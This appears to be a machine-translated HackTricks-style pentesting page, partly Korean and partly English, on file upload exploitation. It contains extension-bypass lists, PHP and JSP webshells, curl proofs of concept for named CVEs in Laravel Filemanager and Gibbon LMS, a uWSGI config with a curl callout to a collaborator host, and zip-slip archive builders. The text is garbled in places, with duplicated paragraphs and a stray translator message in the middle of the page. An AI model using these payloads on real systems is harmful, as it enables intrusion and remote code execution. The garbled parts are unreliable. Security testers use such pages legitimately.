# 파일 업로드

{{#include ../../banners/hacktricks-training.md}}

## 파일 업로드 일반 방법론

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### 파일 확장자 검사 우회

1. 적용된다면, **이전 확장자들을 확인**하세요. 또한 일부 **대문자**를 사용해 테스트해보세요: _pHp, .pHP5, .PhAr ..._
2. _실행 확장자 앞에 **유효한 확장자 추가**를 확인하세요 (이전 확장자들도 사용):_
- _file.png.php_
- _file.png.Php5_
3. 끝에 **특수 문자**를 추가해보세요. Burp를 사용해 모든 **ascii** 및 **Unicode** 문자를 **bruteforce**할 수 있습니다. (_이전에 언급된 **extensions**들도 시도해볼 수 있습니다_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. 서버 측의 확장자 파서를 속여 보호를 우회해 보세요 (예: **doubling the extension** 또는 확장자 사이에 **junk** 데이터(**null** bytes) 추가). _더 나은 페이로드를 위해 이전 확장자들도 사용할 수 있습니다._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 이전 검사에 **또 다른 확장자 레이어**를 추가해보세요:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **exec extension을 유효한 확장자 앞에 두고** 시도해보세요—서버가 잘못 구성되어 있기를 바라세요. (Apache misconfigurations를 악용할 때 유용: 확장자가 **.php**이면 반드시 **.php로 끝나지 않아도** 코드가 실행될 수 있습니다):
- _ex: file.php.png_
7. **Windows**에서 NTFS alternate data stream (ADS)을 사용해보세요. 이 경우 콜론 ":" 문자가 금지된 확장자 뒤와 허용된 확장자 앞에 삽입됩니다. 결과적으로 서버에 **금지된 확장자의 빈 파일**이 생성될 수 있습니다 (예: "file.asax:.jpg”). 이 파일은 short filename 같은 다른 기법으로 나중에 편집될 수 있습니다. "**::$data**” 패턴은 non-empty 파일을 만들 때도 사용될 수 있으므로, 이 패턴 뒤에 점 문자를 추가하는 것도 추가 제한을 우회하는 데 유용할 수 있습니다 (예: "file.asp::$data.”)
8. 파일명 길이 제한을 깨보세요. 유효한 확장자가 잘리고 악성 PHP가 남을 수 있습니다. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

일부 업로드 핸들러는 저장된 파일명에서 끝의 점 문자를 잘라내거나 정규화합니다. UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) 버전 2.9.1 이전에서는 다음 방식으로 확장자 검증을 우회할 수 있습니다:

- 유효한 이미지 MIME과 magic header 사용(예: PNG의 `\x89PNG\r\n\x1a\n`).
- 업로드 파일 이름을 PHP 확장자 뒤에 점을 붙여 지정, 예: `shell.php.`.
- 서버가 끝의 점을 제거하고 `shell.php`로 저장하며, 웹에서 서빙되는 디렉터리(기본 public storage like `/storage/files/`)에 배치될 경우 실행됩니다.

최소 PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
그런 다음 저장된 경로를 호출하세요 (일반적으로 Laravel + LFM에서):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Find a vulnerability to **rename** the file already uploaded (to change the extension).
- Find a **Local File Inclusion** vulnerability to execute the backdoor.
- **Possible Information disclosure**:
1. 같은 이름으로 **같은 파일을** 여러 번(그리고 **동시에**) 업로드해 보세요.
2. 이미 존재하는 **파일** 또는 **폴더** 이름으로 파일을 업로드해 보세요.
3. 파일 이름을 **"." , "..", or "…"** 로 업로드해 보세요. 예를 들어, Apache가 **Windows**에서 애플리케이션이 업로드된 파일을 "/www/uploads/" 디렉터리에 저장하는 경우, "." 파일명은 "/www/" 디렉터리에 "uploads”라는 파일을 생성할 수 있습니다.
4. **NTFS**에서 **"…:.jpg"**와 같이 쉽게 삭제되지 않는 파일을 업로드해 보세요. (Windows)
5. 파일 이름에 `|<>*?”` 같은 **잘못된 문자**를 포함한 파일을 **Windows**에 업로드해 보세요. (Windows)
6. CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9와 같은 **예약(금지) 이름**을 사용하여 **Windows**에 파일을 업로드해 보세요.
- 또한 피해자가 실수로 열었을 때 **코드가 실행되는** 실행 파일(.exe)이나 덜 의심스러운 **.html** 파일을 업로드해 보세요.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

payload의 실행은 구성 파일을 파싱하는 동안 발생합니다. 구성이 활성화되어 파싱되려면 uWSGI 프로세스를 재시작해야 하며(충돌 후 또는 Denial of Service 공격으로 인해) 또는 파일이 auto-reload로 설정되어 있어야 합니다. auto-reload 기능이 활성화된 경우 변경을 감지하면 지정한 간격으로 파일을 다시 로드합니다.

It's crucial to understand the lax nature of uWSGI's configuration file parsing. Specifically, the discussed payload can be inserted into a binary file (such as an image or PDF), further broadening the scope of potential exploitation.

uWSGI의 구성 파일 파싱이 느슨하다는 점을 이해하는 것이 중요합니다. 특히 논의된 payload는 binary 파일(예: image 또는 PDF)에 삽입될 수 있어 잠재적 악용 범위를 더욱 넓힙니다.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

Gibbon LMS의 인증되지 않은 endpoint는 웹 루트 내에 arbitrary file write를 허용하여 PHP 파일을 업로드함으로써 pre-auth RCE를 유발합니다. 취약 버전: 25.0.01까지(포함).

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- 필수 params:
- `img`: data-URI 형태의 문자열: `[mime];[name],[base64]` (서버는 type/name을 무시하고 꼬리 부분을 base64로 디코드함)
- `path`: Gibbon 설치 디렉터리 기준 상대 경로의 대상 파일명(예: `poc.php` 또는 `0xdf.php`)
- `gibbonPersonID`: 비어 있지 않은 값이면 어떤 값이든 허용(예: `0000000001`)

Minimal PoC to write and read back a file:

파일을 쓰고 다시 읽어오는 Minimal PoC:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
최소한의 webshell을 업로드하고 명령을 실행:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notes:
- The handler performs `base64_decode($_POST["img"])` after splitting by `;` and `,`, then writes bytes to `$absolutePath . '/' . $_POST['path']` without validating extension/type.
- Resulting code runs as the web service user (e.g., XAMPP Apache on Windows).

References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.

## **wget File Upload/SSRF Trick**

경우에 따라 서버가 **`wget`**으로 **파일을 다운로드**하도록 사용되고 있으며, 사용자가 **URL**을 **지정할 수** 있는 상황을 발견할 수 있습니다. 이런 경우 코드가 다운로드된 파일의 확장자가 허용 목록(whitelist)에 포함되어 있는지 확인하여 허용된 파일만 다운로드되도록 검사할 수 있습니다. 하지만, **이 검사는 우회될 수 있습니다.**\
**linux**에서 **filename**의 **최대** 길이는 **255**이지만, **wget**은 파일명을 **236**자로 잘라냅니다. 예를 들어 **download a file called "A"*232+".php"+".gif"**를 수행하면, 이 파일명은 **검사**를 **우회**합니다(이 예에서 **".gif"**는 **valid**한 확장자이기 때문에) 그러나 `wget`은 파일명을 **"A"*232+".php"**로 **이름을 변경**합니다.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### NTFS junctions (Windows)을 통한 업로드 디렉터리 탈출

(이 공격을 위해서는 Windows 머신에 대한 로컬 접근 권한이 필요합니다) Windows에서 업로드가 사용자별 하위 폴더(예: C:\Windows\Tasks\Uploads\<id>\)에 저장되고 해당 하위 폴더의 생성/삭제를 제어할 수 있다면, 그 하위 폴더를 민감한 위치(예: webroot)를 가리키는 directory junction으로 교체할 수 있습니다. 이후 업로드된 파일들은 타깃 경로에 기록되며, 타깃이 server-side code를 해석할 경우 코드 실행이 가능해집니다.

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notes
- mklink /J creates an NTFS directory junction (reparse point). 웹 서버 계정은 junction을 따라가야 하며 대상(destination)에 대한 쓰기 권한이 있어야 합니다.
- This redirects arbitrary file writes; if the destination executes scripts (PHP/ASP), this becomes RCE.
- Defenses: don’t allow writable upload roots to be attacker‑controllable under C:\Windows\Tasks or similar; block junction creation; validate extensions server‑side; store uploads on a separate volume or with deny‑execute ACLs.

### GZIP-compressed body upload + destination param에서의 path traversal → JSP webshell RCE (Tomcat)

일부 upload/ingest handlers는 raw request body를 user-controlled query parameters로 구성된 filesystem path에 기록합니다. 핸들러가 Content-Encoding: gzip을 지원하고 destination path를 정규화/검증하지 않으면, directory traversal과 gzipped payload를 결합해 웹으로 서비스되는 디렉터리에 임의의 바이트를 쓰고 RCE를 얻을 수 있습니다(예: Tomcat의 webapps에 JSP를 drop).

Generic exploitation flow:
- Prepare your server-side payload (e.g., minimal JSP webshell) and gzip-compress the bytes.
- Send a POST where a path parameter (e.g., token) contains traversal escaping the intended folder, and file indicates the filename to persist. Set Content-Type: application/octet-stream and Content-Encoding: gzip; the body is the compressed payload.
- Browse to the written file to trigger execution.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
해당 파일(src/pentesting-web/file-upload/README.md)의 내용이 제공되지 않았습니다. 번역할 텍스트를 붙여넣어 주세요. 제가 파일에 직접 접근할 수는 없으며, 번역할 때는 코드·태그·링크·경로·해킹 용어 등은 번역하지 않고 원문 그대로 유지하겠습니다.
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notes
- 설치 환경에 따라 대상 경로는 다릅니다 (예: /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). JSP를 실행하는 웹에 노출된 어떤 폴더든 작동합니다.
- Burp Suite’s Hackvertor extension는 페이로드로부터 올바른 gzip body를 생성할 수 있습니다.
- 이것은 순수한 pre-auth arbitrary file write → RCE 패턴입니다; multipart parsing에 의존하지 않습니다.

Mitigations
- 업로드 대상은 서버 측에서 결정하십시오; 클라이언트로부터 온 경로 조각을 절대 신뢰하지 마십시오.
- 경로를 정규화(canonicalize)하고 해결된 경로가 허용 목록에 있는 기본 디렉토리 내에 머무르도록 강제하십시오.
- 업로드된 파일은 실행 불가능한 볼륨에 저장하고 쓰기 가능한 경로에서 스크립트 실행을 차단하십시오.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) 는 파일 업로드 메커니즘을 테스트하는 데 있어 Pentesters와 Bug Hunters를 지원하도록 설계된 강력한 도구입니다. 다양한 bug bounty 기법을 활용하여 취약점을 식별하고 악용하는 과정을 단순화하며, 웹 애플리케이션에 대한 철저한 평가를 보장합니다.

### Corrupting upload indices with snprintf quirks (historical)

일부 레거시 upload handlers가 `snprintf()` 또는 유사한 함수를 사용해 단일 파일 업로드로부터 multi-file 배열을 구성할 때, `_FILES` 구조를 위조하도록 속일 수 있습니다. `snprintf()` 동작의 불일치와 잘림(truncation) 때문에, 정교하게 조작된 단일 업로드가 서버 측에서 여러 인덱스된 파일로 보일 수 있어 엄격한 형태를 가정하는 로직(예: 다중 파일 업로드로 처리하고 안전하지 않은 분기를 택함)을 혼동시킵니다. 오늘날에는 드물지만 이 “index corruption” 패턴은 가끔 CTF나 오래된 코드베이스에서 다시 등장합니다.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- 웹 서버에 URL에서 이미지를 가져오도록 지시할 수 있다면 [SSRF](../ssrf-server-side-request-forgery/index.html)를 악용해 볼 수 있습니다. 이 **image**가 어떤 **public** 사이트에 **saved**될 예정이라면, [https://iplogger.org/invisible/](https://iplogger.org/invisible/)의 URL을 지정하여 **모든 방문자의 정보**를 훔칠 수도 있습니다.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- 특수 제작된 PDF로 XSS: [다음 페이지는 **PDF 데이터 주입으로 JS 실행을 얻는 방법**을 제시합니다](../xss-cross-site-scripting/pdf-injection.md). PDF를 업로드할 수 있다면 주어진 지시에 따라 임의의 JS를 실행하는 PDF를 준비할 수 있습니다.
- 서버에 안티바이러스가 있는지 확인하려면 \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) 내용을 업로드해 보세요.
- 파일 업로드 시 **size limit**이 있는지 확인하세요

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

다른 파일타입은 [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) 를 참조하세요.

## Zip/Tar File Automatically decompressed Upload

서버 내부에서 압축 해제될 ZIP을 업로드할 수 있다면, 두 가지를 할 수 있습니다:

### Symlink

다른 파일에 대한 심볼릭 링크(soft links)를 포함한 링크를 업로드한 다음, 압축 해제된 파일에 접근할 때 연결된 파일들에도 접근하게 됩니다:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 다른 폴더로 압축 해제

압축 해제 시 디렉터리에 예상치 못한 파일이 생성되는 문제는 심각합니다. 처음에는 이 구성이 악성 파일 업로드를 통한 OS-level command execution을 방지할 수 있을 것으로 생각될 수 있지만, ZIP archive format의 계층적 압축 지원과 directory traversal 기능은 악용될 수 있습니다. 이를 통해 공격자는 대상 애플리케이션의 decompression 기능을 조작하여 제한을 우회하고 보안 업로드 디렉터리에서 탈출할 수 있습니다.

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). 해당 유틸리티는 다음과 같이 사용할 수 있습니다:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
또한, **symlink trick with evilarc** 도 옵션입니다. 만약 목표가 `/flag.txt` 같은 파일을 대상으로 하는 것이라면, 해당 파일에 대한 symlink를 시스템에 생성해야 합니다. 이렇게 하면 evilarc가 실행 중 오류를 만나지 않도록 할 수 있습니다.

아래는 악성 zip 파일을 생성하는 데 사용되는 Python 코드의 예입니다:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**압축 악용을 통한 file spraying**

자세한 내용은 **원문 게시물 확인**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **PHP Shell 생성**: PHP 코드는 `$_REQUEST` 변수를 통해 전달된 명령을 실행하도록 작성된다.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying 및 압축 파일 생성**: 여러 파일을 생성하고 이러한 파일들을 포함하는 zip 아카이브를 만든다.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Hex Editor 또는 vi로 수정**: zip 내부의 파일 이름을 vi나 hex editor를 사용해 변경하여 "xxA"를 "../"로 바꿔 디렉토리 트래버설을 수행한다.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

백엔드가 PHP’s ZipArchive를 사용해 ZIP 항목을 검증하지만 추출 시 파일시스템에 raw 이름으로 쓰는 경우, 파일명 필드에 NUL(0x00)을 삽입해 허용되지 않은 확장자를 스머글할 수 있다. ZipArchive는 항목 이름을 C‑string으로 취급해 첫 번째 NUL에서 잘라내고; 파일시스템은 NUL 이후를 무시하지 않고 전체 이름을 기록한다.

전체 흐름:
- 유효한 PDF 같은 합법적인 컨테이너 파일을 준비하되, 스트림에 작은 PHP 스텁을 임베드해 magic/MIME이 PDF로 유지되도록 한다.
- 파일명을 `shell.php..pdf`처럼 지정하고 zip한 다음, ZIP 로컬 헤더와 central directory의 파일명을 헥스 편집해서 `.php` 뒤의 첫 번째 `.`를 `0x00`으로 교체하여 `shell.php\x00.pdf`가 되게 한다.
- ZipArchive에 의존하는 검증기는 `shell.php .pdf`를 “보여” 허용할 것이고; 추출기는 `shell.php`를 디스크에 기록하여 업로드 폴더가 실행 가능하면 RCE로 이어질 수 있다.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

